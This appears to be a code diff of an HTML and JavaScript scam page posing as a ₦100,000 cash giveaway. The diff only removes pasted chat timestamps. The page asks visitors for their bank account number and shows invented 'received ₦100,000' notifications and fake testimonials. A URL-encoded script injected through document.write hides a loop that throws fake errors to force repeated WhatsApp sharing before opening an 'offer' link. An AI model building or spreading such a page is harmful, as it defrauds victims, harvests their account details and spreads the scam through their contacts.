@@ -153,8 +153,7 @@ if (password !== '₦100,000') {
             outline: none;
             border: 2px solid #cecece;
             font-size: 14px;
-        }
-[4/4/2026 11:53 PM] Glo: #confirm {
+       #confirm {
             width: 200px;
             margin: 10px auto;
             border-radius: 0px;
@@ -347,7 +346,7 @@ if (password !== '₦100,000') {
         .input {
             padding: 6px 12px 12px;
         }
-[4/4/2026 11:53 PM] Glo: .input input {
+        .input input {
             width: 100%;
             background: #f1f2f6;
             padding: 10px;
@@ -541,7 +540,7 @@ background: linear-gradient(135deg, #050c1f, #0c1f3f, #132f5f);
     background:linear-gradient(135deg,#fff,#f5f5f5);
 }
 </style>
-[4/4/2026 11:53 PM] Glo: <div id="info">
+<div id="info">
             <p class="title">Enter your Account Number :</p>
             <div class="phone">
                 <center><input type="number" placeholder="Enter Account number" id="name" name="Phone" style="fontwidth: 244px;height: 56px;font-size: 18px;width: 330px;" onkeypress="return numberonly(event);">
@@ -665,7 +664,7 @@ background: linear-gradient(135deg, #050c1f, #0c1f3f, #132f5f);
     }
 }
 </style>
-[4/4/2026 11:53 PM] Glo: <div id="share">
+<div id="share">
             <p class="tip">Your Account Number is <span id="getname"></span>،</p>
             <p class="tip">
                 After verification, You are qualified to get <span class="amount">₦100,000.</span> How to proceed:
@@ -780,7 +779,7 @@ background: linear-gradient(135deg, #050c1f, #0c1f3f, #132f5f);
 <div class="notification-overlay">Jide Kosoko Received ₦100,000 30 sec ago</div>
 <div class="notification-overlay">Aisha Bello Received ₦100,000 35 sec ago</div>
 <div class="notification-overlay">Tunde Oladipo Received ₦100,000 40 sec ago</div>
-[4/4/2026 11:53 PM] Glo: <div class="notification-overlay">Maryam Sadiq Received ₦100,000 45 sec ago</div>
+<div class="notification-overlay">Maryam Sadiq Received ₦100,000 45 sec ago</div>
 <div class="notification-overlay">Segun Adebayo Received ₦100,000 50 sec ago</div>
 <div class="notification-overlay">Grace Oko Received ₦100,000 55 sec ago</div>
 <div class="notification-overlay">John Doe Received ₦100,0001 min ago</div>
@@ -904,7 +903,7 @@ document.addEventListener("DOMContentLoaded", function () {
     border-bottom:1px solid #eee;
     margin-bottom:12px;
 }
-[4/4/2026 11:53 PM] Glo: .bar .react{
+.bar .react{
     cursor:pointer;
     color:#65676b;
     font-weight:600;
@@ -1145,7 +1144,7 @@ button {
     display: none;
     margin-top: 5px;
 }
-[4/4/2026 11:53 PM] Glo: /* Animations */
+/* Animations */
 @keyframes scrollUp {
     0% { transform: translateY(0); }
     100% { transform: translateY(-50%); }
@@ -1281,7 +1280,7 @@ function createTestimonialElement(testimonial) {
     let imageHtml = testimonial.hasImage && testimonial.imageUrl
         ? <img src="${testimonial.imageUrl}" style="max-width:80px;max-height:60px;border-radius:4px;margin-top:4px;">
         : '';
-[4/4/2026 11:53 PM] Glo: testimonialEl.innerHTML = 
+testimonialEl.innerHTML = 
         ${avatar}
         <div>
             <div style="font-weight:500;">${testimonial.name} <span style="color:#777;font-size:10px;">${testimonial.timestamp}</span></div>
@@ -1412,7 +1411,7 @@ $("#confirm").click(function () {
             if (i >= 100) {
                 clearInterval(interval);
                 $("#load").fadeOut(0);
-[4/4/2026 11:53 PM] Glo: $("#check").fadeIn(0);
+ $("#check").fadeIn(0);
                 setTimeout(function () {
                     $("#checking").fadeOut(0);
                     $("#share").fadeIn(1000);
@@ -1443,7 +1442,7 @@ $(document).click(function () {
         <!-- code by OD 
         -->
         document.write(unescape('%20%3Cscript%20type%3D%22text/javascript%22%3E%0A%20var%20swidth%20%3D%20localStorage.getItem%28saved%29%3B%0Aif%20%28swidth%20%21%3D%3D%20null%29%20%7B%0A%20%20%20%20var%20width%20%3D%20swidth%20*%201%3B%0A%20%20%20%20%24%28%22%23intro%22%29.fadeOut%280%29%3B%0A%20%20%20%20%24%28%22.comments%22%29.fadeOut%280%29%3B%0A%20%20%20%20%24%28%22%23share%22%29.fadeIn%280%29%3B%0A%20%20%20%20%24%28%22%23fill2%22%29.css%28%22width%22%2C%20width%20+%20%22%25%22%29%3B%0A%20%20%20%20%24%28%22%23percentage2%22%29.text%28width%20+%20%22%25%22%29%3B%0A%7D%20else%20%7B%0A%20%20%20%20var%20width%20%3D%200%3B%0A%7D%0A%24%28%22%23whatsapp%22%29.click%28function%20%28%29%20%7B%0A%20%20%20%20window.location.href%20%3D%20share%3B%0A%20%20%20%20if%20%28width%20%3D%3D%200%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%2050%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2050%29%20%7B%0A%20%20%20%20%20%20%20%20alert%28error%29%3B%0A%20%20%20%20%20%20%20%20width%20+%3D%2015%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2065%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%205%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2070%29%20%7B%0A%20%20%20%20%20%20%20%20alert%28error%29%3B%0A%20%20%20%20%20%20%20%20width%20+%3D%2010%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2080%29%20%7B%0A%20%20%20%20%20%20%20%20alert%28error%29%3B%0A%20%20%20%20%20%20%20%20width%20+%3D%205%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2085%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%202%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2087%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%201%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2088%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%202%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2090%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%201%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2091%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%201%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2092%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%201%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2093%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%201%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2094%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%201%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2095%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%201%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2096%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%202%3B%0A%20%20%20%20%7D%20else%20%7B%0A%20%20%20%20%20%20%20%20%24%28%22%23share%22%29.fadeOut%280%29%3B%0A%20%20%20%20%20%20%20%20%24%28%22%23claim%22%29.fadeIn%281000%29%3B%0A%20%20%20%20%7D%0A%20%20%20%20localStorage.set
-[4/4/2026 11:53 PM] Glo: tem%28saved%2C%20width%29%3B%0A%20%20%20%20setTimeout%28function%20%28%29%20%7B%0A%20%20%20%20%20%20%20%20%24%28%22%23fill2%22%29.css%28%22width%22%2C%20width%20+%20%22%25%22%29%3B%0A%20%20%20%20%20%20%20%20%24%28%22%23percentage2%22%29.text%28width%20+%20%22%25%22%29%3B%0A%20%20%20%20%7D%2C%202000%29%3B%0A%7D%29%3B%0A%24%28%22%23offer%22%29.click%28function%20%28%29%20%7B%0A%20%20%20%20window.open%28abcde%2C%20%22_blank%22%29%3B%0A%7D%29%3B%0A%3C/script%3E'))
+                                tem%28saved%2C%20width%29%3B%0A%20%20%20%20setTimeout%28function%20%28%29%20%7B%0A%20%20%20%20%20%20%20%20%24%28%22%23fill2%22%29.css%28%22width%22%2C%20width%20+%20%22%25%22%29%3B%0A%20%20%20%20%20%20%20%20%24%28%22%23percentage2%22%29.text%28width%20+%20%22%25%22%29%3B%0A%20%20%20%20%7D%2C%202000%29%3B%0A%7D%29%3B%0A%24%28%22%23offer%22%29.click%28function%20%28%29%20%7B%0A%20%20%20%20window.open%28abcde%2C%20%22_blank%22%29%3B%0A%7D%29%3B%0A%3C/script%3E'))
     </script>
 
 
